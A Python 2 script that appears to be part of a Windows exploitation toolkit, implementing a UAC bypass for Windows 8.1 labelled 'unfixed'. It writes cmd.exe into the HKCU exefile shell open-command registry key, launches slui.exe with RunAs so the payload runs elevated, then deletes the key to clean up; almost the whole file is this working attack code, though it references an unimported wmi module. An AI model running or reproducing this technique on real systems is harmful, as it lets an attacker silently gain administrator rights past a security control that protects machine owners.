"""
Works from: Windows 8.1 (9600)
Fixed in: unfixed
"""
import os
import time
import ctypes
import _winreg
from colorama import init, Fore
init(convert=True)

wmi = wmi.WMI()

payload = "c:\\windows\\system32\\cmd.exe"

def successBox():
	return (Fore.GREEN + '[+]' + Fore.RESET)
	
def errorBox():
	return (Fore.RED + '[-]' + Fore.RESET)

def infoBox():
	return (Fore.CYAN + '[!]' + Fore.RESET)	
	
def warningBox():
	return (Fore.YELLOW + '[!]' + Fore.RESET)

class disable_file_system_redirection:
    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
    def __enter__(self):
        self.old_value = ctypes.c_long()
        self.success = self.disable(ctypes.byref(self.old_value))
    def __exit__(self, type, value, traceback):
        if self.success:
            self.revert(self.old_value)

def slui():
	print " {} slui: Attempting to create registry key".format(infoBox())
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
					os.path.join("Software\Classes\exefile\shell\open\command"))
								
		_winreg.SetValueEx(key,
				None,
				0,
				_winreg.REG_SZ,
				payload)

		_winreg.SetValueEx(key,
				"DelegateExecute",
				0,
				_winreg.REG_SZ,
				None)

		_winreg.CloseKey(key)
		print " {} slui: Registry key created".format(successBox())
	except Exception as error:
		print " {} slui: Unable to create key".format(errorBox())
		return False

	print " {} slui: Pausing for 5 seconds before executing".format(infoBox())
	time.sleep(5)

	print " {} slui: Attempting to create process".format(infoBox())
	with disable_file_system_redirection():
		try:
			if (ctypes.windll.Shell32.ShellExecuteA(None,"RunAs","slui.exe",None,None,1) == 42):
				print " {} slui: Process started successfully".format(successBox())
			else:
				print " {} slui: Problem creating process".format(errorBox())
				return False
		except Exception as error:
			print " {} slui: Problem creating process".format(errorBox())
			return False

	"""
	print " {} slui: Attempting to create process".format(infoBox())
	try:
		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start slui.exe",
						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
		if (result[1] == 0):
			print " {} slui: Process started successfully".format(successBox())
		else:
			print " {} slui: Problem creating process".format(errorBox())
	except Exception as error:
		print " {} slui: Problem creating process".format(errorBox())
		return False
	"""
	
	print " {} slui: Pausing for 5 seconds before cleaning".format(infoBox())
	time.sleep(5)

	print " {} slui: Attempting to remove registry key".format(infoBox())
	try:
		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
				os.path.join("Software\Classes\exefile\shell\open\command"))
		print " {} slui: Registry key was deleted".format(successBox())					
	except Exception as error:
		print " {} slui: Unable to delete key".format(errorBox())
		return False
